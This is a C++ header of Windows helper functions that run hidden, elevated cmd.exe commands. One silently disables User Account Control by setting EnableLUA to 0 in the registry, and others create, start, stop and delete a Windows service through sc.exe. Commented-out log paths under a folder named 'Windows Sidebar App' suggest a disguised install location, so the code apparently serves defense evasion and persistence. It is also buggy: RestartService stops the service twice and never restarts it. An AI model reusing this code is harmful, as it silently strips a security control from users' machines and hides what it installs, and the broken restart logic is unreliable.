#pragma once 

#include "../Tools/Log.h"
#include <string>

#include <Shellapi.h>
#pragma commnet(lib, "Shell32.lib");

static int DisableUAC()
{
	HINSTANCE hIns = 0;

	std::wstring strDisableUAC;

	strDisableUAC = L"/c %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f";
	//strDisableUAC += L" > C:\\er.txt";

	hIns = ShellExecute(NULL, L"runas", L"C:\\windows\\system32\\cmd.exe ", strDisableUAC.c_str(), NULL, SW_HIDE);

	return 0;
}

static int EnableUAC()
{
	HINSTANCE hIns = 0;

	std::wstring strDisableUAC;

	strDisableUAC = L"/c %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f";
	//strDisableUAC += L" > C:\\er.txt";

	hIns = ShellExecute(NULL, L"runas", L"C:\\windows\\system32\\cmd.exe ", strDisableUAC.c_str(), NULL, SW_HIDE);

	return 0;
}

static int StartService()
{
	HINSTANCE hIns = 0;

	//std::wstring strStartCmd;
	//strStartCmd = L"@cd / d \"%~dp0\"";

	std::wstring strCreateServiceW;

	strCreateServiceW = L"/c sc.exe create ";
	strCreateServiceW += strNameService;
	strCreateServiceW += L" binPath=\"";
	strCreateServiceW += getStrPath(str_WindowStartService);
	strCreateServiceW += L"\"";
	//strCreateServiceW += L" > C:\\ProgramData\\Windows Sidebar App\\er0.txt";

	std::wstring strStartServiceW;
	strStartServiceW = L"/c sc.exe start ";
	strStartServiceW += strNameService;
	//strStartServiceW += L" > C:\\ProgramData\\Windows Sidebar App\\er1.txt";

	//std::string strCreateService(strCreateServiceW.begin(), strCreateServiceW.end());
	//std::string strStartService(strStartServiceW.begin(), strStartServiceW.end());

	//system(strStartCmd.c_str());
	//system(strCreateService.c_str());
	//system(strStartService.c_str());

	//WinExec(strStartCmd.c_str(), SW_HIDE);
	//WinExec(strCreateService.c_str(), SW_HIDE);
	//Sleep(3000);
	//WinExec(strStartService.c_str(), SW_HIDE);

	// ! for ShellExecute need add /c to start strings !

	hIns = ShellExecute(NULL, L"runas", L"C:\\windows\\system32\\cmd.exe ", strCreateServiceW.c_str(), NULL, SW_HIDE);
	Sleep(3000);
	hIns = ShellExecute(NULL, L"runas", L"C:\\windows\\system32\\cmd.exe ", strStartServiceW.c_str(), NULL, SW_HIDE);

	return 0;
}

static int StopService()
{
	HINSTANCE hIns = 0;

	std::wstring strStopServiceW;
	strStopServiceW = L"/c sc.exe stop ";
	strStopServiceW += strNameService;

	std::wstring strDeleteServiceW;
	strDeleteServiceW = L"/c sc.exe delete ";
	strDeleteServiceW += strNameService;

	std::string strStopService(strStopServiceW.begin(), strStopServiceW.end());
	std::string strDeleteService(strDeleteServiceW.begin(), strDeleteServiceW.end());

	//WinExec(strStopService.c_str(), SW_HIDE);
	//Sleep(3000);
	//WinExec(strDeleteService.c_str(), SW_HIDE);

	// ! for ShellExecute need add /c to start strings !

	hIns = ShellExecute(NULL, L"runas", L"C:\\windows\\system32\\cmd.exe ", strStopServiceW.c_str(), NULL, SW_HIDE);
	Sleep(3000);
	hIns = ShellExecute(NULL, L"runas", L"C:\\windows\\system32\\cmd.exe ", strDeleteServiceW.c_str(), NULL, SW_HIDE);

	return 0;
}

static int RestartService()
{
	StopService();

	Sleep(3000);

	StopService();

	return 0;
}